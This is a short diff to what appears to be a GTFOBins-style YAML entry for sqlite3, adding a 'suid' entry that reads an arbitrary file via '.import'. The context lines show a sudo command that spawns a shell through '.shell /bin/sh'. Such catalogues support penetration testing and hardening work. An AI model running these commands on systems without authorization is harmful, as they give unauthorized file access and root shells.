@@ -14,6 +14,14 @@ functions:
         .import $LFILE t
         SELECT * FROM t;
         EOF
+  suid:
+    - code: |
+        LFILE=file_to_read
+        sqlite3 << EOF
+        CREATE TABLE t(line TEXT);
+        .import $LFILE t
+        SELECT * FROM t;
+        EOF
   sudo:
     - code: sudo sqlite3 /dev/null '.shell /bin/sh'
   limited-suid:
